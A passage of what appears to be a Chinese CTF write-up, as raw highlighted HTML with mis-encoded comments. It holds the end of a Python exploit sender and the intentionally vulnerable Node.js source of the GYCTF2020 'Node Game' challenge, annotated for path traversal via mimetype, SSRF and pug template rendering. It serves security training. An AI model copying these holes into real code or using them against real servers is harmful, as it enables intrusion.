&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ¬åœ°å¤çŽ°æˆåŠŸ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206192539624.png" alt="image-20211206192539624">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206191832996.png" alt="image-20211206191832996">&lt;/p>
&lt;h2 id="gyctf2020node-game">[GYCTF2020]Node Game&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pug&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">morgan&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;morgan&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">multer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;multer&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">multer&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">dest&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;./dist&amp;#39;&lt;/span>&lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">morgan&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;short&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// ç®€åŒ–ç‰ˆæ—¥å¿—
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/uploads&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;/uploads&amp;#39;&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/template&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;/template&amp;#39;&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">action&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;index&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// actionå‚æ•°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\\&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// ä¸èƒ½æœ‰/ \
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Errrrr, You have been Blocked&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/template/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">action&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;.pug&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">pug&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">renderFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// æ¨¡æ¿æ¸²æŸ“
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">html&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/file_upload&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// éœ€è¦SSRF
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;only admin&amp;#39;s ip can use it&amp;#34;&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;upload failed&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/uploads/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">mimetype&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// è·¯å¾„ç¡®å®š mimetypeå¯æŽ§ è·¯å¾„ç©¿è¶Š
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">file_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">originalname&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">dir_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_name&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mkdirSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;file type error&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">writeFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir_file&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;upload success&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_name&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;upload failed&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æºç 
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/template/source.txt&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/core&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// qå‚æ•°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://localhost:8081/source?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#75715e">// å¯æŽ§ç«¯ç‚¹
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// é»‘åå•è¿‡æ»¤
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt;error occurs!&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;ECONNRESET&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Timeout occurs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">resps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
